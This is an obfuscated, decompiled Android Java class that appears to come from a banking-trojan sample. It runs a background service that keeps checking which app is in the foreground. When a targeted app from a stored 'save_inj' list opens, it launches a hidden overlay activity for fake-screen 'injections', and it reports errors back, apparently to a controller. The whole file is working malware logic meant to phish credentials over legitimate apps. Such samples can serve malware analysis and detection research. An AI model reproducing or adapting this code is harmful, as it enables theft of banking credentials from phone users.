package wocwvy.czyxoxmbauu.slsa;

import android.app.ActivityManager;
import android.app.IntentService;
import android.app.KeyguardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.ncec.pltrfi;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p003b.C0057g;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p003b.C0058h;

/* JADX INFO: loaded from: classes.dex */
public class wfveenegvz extends IntentService {

    /* JADX INFO: renamed from: a */
    C0020b f595a;

    /* JADX INFO: renamed from: b */
    Context f596b;

    /* JADX INFO: renamed from: c */
    C0022c f597c;

    public wfveenegvz() {
        super("");
        this.f595a = new C0020b();
        this.f597c = new C0022c();
    }

    /* JADX INFO: renamed from: b */
    private ArrayList<String> m348b() {
        String strM257j;
        ArrayList<String> arrayList = new ArrayList<>();
        if (Build.VERSION.SDK_INT <= 19) {
            List<ActivityManager.RunningTaskInfo> runningTasks = ((ActivityManager) getSystemService("activity")).getRunningTasks(1);
            ComponentName componentName = runningTasks.get(0).topActivity;
            strM257j = runningTasks.get(0).topActivity.getPackageName();
        } else if (Build.VERSION.SDK_INT > 19 && Build.VERSION.SDK_INT <= 21) {
            strM257j = ((ActivityManager) getSystemService("activity")).getRunningAppProcesses().get(0).processName;
        } else {
            if (Build.VERSION.SDK_INT > 21 && Build.VERSION.SDK_INT <= 23) {
                List<C0057g> listM326a = C0058h.m326a(this);
                ArrayList<String> arrayList2 = new ArrayList<>();
                Iterator<C0057g> it = listM326a.iterator();
                while (it.hasNext()) {
                    arrayList2.add(it.next().m323d().trim());
                }
                return arrayList2;
            }
            int i = Build.VERSION.SDK_INT;
            strM257j = this.f595a.m257j(this.f596b);
        }
        arrayList.add(strM257j);
        return arrayList;
    }

    /* JADX INFO: renamed from: a */
    void m349a() {
        this.f595a.m230a("Start", "apiProc");
        String strM251e = this.f595a.m251e(this.f596b, "save_inj");
        int i = 0;
        while (true) {
            if (i == 0) {
                strM251e = this.f595a.m251e(this.f596b, "save_inj");
                if (strM251e.length() <= 4) {
                    stopSelf();
                    return;
                }
            }
            if (i >= 40) {
                i = -1;
            }
            i++;
            if (this.f595a.m254g(this)) {
                stopSelf();
            }
            Context context = this.f596b;
            if (((KeyguardManager) getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                try {
                    TimeUnit.MILLISECONDS.sleep(10L);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            } else if (strM251e != "" && this.f595a.m262o(this.f596b)) {
                try {
                    TimeUnit.MILLISECONDS.sleep(10L);
                } catch (InterruptedException e2) {
                    e2.printStackTrace();
                }
                ArrayList<String> arrayListM348b = m348b();
                this.f595a.m230a("App", "" + arrayListM348b);
                String str = null;
                for (int i2 = 0; i2 < strM251e.split("/").length; i2++) {
                    String[] strArrSplit = strM251e.split("/")[i2].split(",");
                    int i3 = 1;
                    while (true) {
                        if (i3 >= strArrSplit.length) {
                            break;
                        }
                        if (arrayListM348b.contains(strArrSplit[i3])) {
                            str = strArrSplit[0];
                            break;
                        }
                        i3++;
                    }
                    if (str != null) {
                        break;
                    }
                }
                if (str != null) {
                    Context context2 = this.f596b;
                    if (!((KeyguardManager) getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                        try {
                            if (!this.f595a.m251e(this.f596b, "name").contains("true")) {
                                Intent intentPutExtra = new Intent(this, (Class<?>) pltrfi.class).putExtra("str", str);
                                intentPutExtra.addFlags(268435456);
                                intentPutExtra.addFlags(8388608);
                                intentPutExtra.addFlags(1073741824);
                                startActivity(intentPutExtra);
                            }
                        } catch (Exception unused) {
                            C0020b c0020b = this.f595a;
                            Context context3 = this.f596b;
                            StringBuilder sb = new StringBuilder();
                            sb.append("p=");
                            sb.append(this.f595a.m242c(this.f595a.m264q(this) + "|ERROR START INJECTIONS|"));
                            c0020b.m235b(context3, "4", sb.toString());
                        }
                    }
                }
            }
        }
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        this.f596b = this;
        this.f595a.m250d(this.f596b, "name", "false");
        if (this.f595a.m251e(this.f596b, "save_inj").length() <= 5) {
            stopSelf();
        }
        m349a();
    }
}
